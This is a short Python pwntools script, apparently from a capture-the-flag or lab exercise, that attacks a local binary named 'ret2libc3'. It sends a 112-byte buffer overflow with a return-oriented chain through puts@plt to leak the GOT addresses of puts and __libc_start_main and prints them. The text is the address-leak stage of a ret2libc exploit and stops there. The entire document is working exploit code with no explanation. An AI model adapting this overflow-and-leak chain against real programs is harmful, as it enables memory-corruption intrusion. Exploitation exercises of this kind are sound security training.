from pwn import *

sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")

puts_plt = ret2libc3.plt['puts']
libc_start_main = ret2libc3.got['__libc_start_main']
start = ret2libc3.symbols['_start']
puts_got= ret2libc3.got['puts']		
sh.sendlineafter('Can you find it !?',flat(['a'*112, puts_plt, start, puts_got]))
put_addr = u32(sh.recv()[0:4])
print (hex(put_addr))
sh.sendline(flat(['A'*112, puts_plt, start, libc_start_main]))
libc_start_main_addr = u32(sh.recv()[0:4])
print (hex(libc_start_main_addr))


